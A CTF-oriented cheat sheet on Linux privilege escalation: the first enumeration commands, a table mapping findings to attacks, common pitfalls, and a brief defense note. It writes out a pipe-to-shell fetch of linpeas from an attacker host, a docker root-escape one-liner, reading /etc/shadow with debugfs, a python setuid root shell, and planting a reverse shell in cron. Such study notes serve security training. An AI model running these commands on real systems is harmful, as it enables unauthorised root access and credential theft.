---
title: Reflex — Privesc — Linux
date: 2026-08-26T00:00:00.000Z
summary: >-
  A shell on a Linux box and root is the goal: the enumeration order that finds
  the way up fastest.
tags:
  - reflexe
  - privesc
  - machine
draft: false
featured: false
source: CTF/03-Reflexes/Reflexe-Privesc-Linux.md
topic: pwn
kind: reflex
---
# Reflex — I have a shell, I want root (Linux)

## ⚡ The first 5 commands, always the same
```bash
id                      # who am I, which groups (lxd? docker? disk?)
sudo -l                 # THE jackpot. What I can run as root without a password
find / -perm -4000 -type f 2>/dev/null   # SUID binaries
uname -a; cat /etc/os-release            # kernel → known exploit?
crontab -l; cat /etc/crontab             # scheduled tasks running as root
```
Then launch **linpeas** in the background: `curl <you>/linpeas.sh | sh` or upload it.

## Decision table
| Finding | Attack | How |
|---|---|---|
| `sudo -l` shows a binary | **GTFOBins** | look the binary up on gtfobins.github.io |
| unusual SUID (`find`, `nmap`, `vim`, `python`) | GTFOBins SUID | same, SUID section |
| `docker` group | mount `/` in a container | `docker run -v /:/mnt -it alpine chroot /mnt sh` |
| `lxd` group | privileged alpine image | classic lxd recipe |
| `disk` group | read `/dev/sda` | `debugfs /dev/sda` → read /root, /etc/shadow |
| cron running a writable script | write your payload | add a reverse shell, wait |
| `.` in the PATH of a SUID script | PATH hijack | create a malicious binary with the called name |
| `cap_setuid` capability | python | `python3 -c 'import os;os.setuid(0);os.system("sh")'` |
| creds in `.env`/history/config | reuse them | `su root`, or on other services |
| old kernel | kernel exploit | DirtyCow, DirtyPipe, PwnKit (pkexec)… LAST |

## 🚧 What blocks you
- You jump straight to a kernel exploit. **No.** 8 times out of 10 it's `sudo -l` or a
  GTFOBins SUID. Kernel exploits are unstable and are the last resort.
- `sudo -l` asks for a password you don't have → look for creds first (history,
  configs, DB).
- A cron that looks exploitable but you don't see it run → check the interval,
  actually wait for it (`pspy` to watch processes without being root).

## 🧰 To keep on you
`linpeas.sh` · `pspy64` · `GTFOBins` bookmarked · `linux-exploit-suggester.sh`

## ✅ I've won when
`id` shows `uid=0(root)`. Go read `/root/root.txt`.

## 🛡 Defense side (interview bonus)
Each vector above leaves a trace: an abnormal SUID (`find` audit), a logged `sudo`, a
modified cron. → S2/19-Systemes-de-Detection-d-Intrusions-IDS

## 🔗 Used in
-
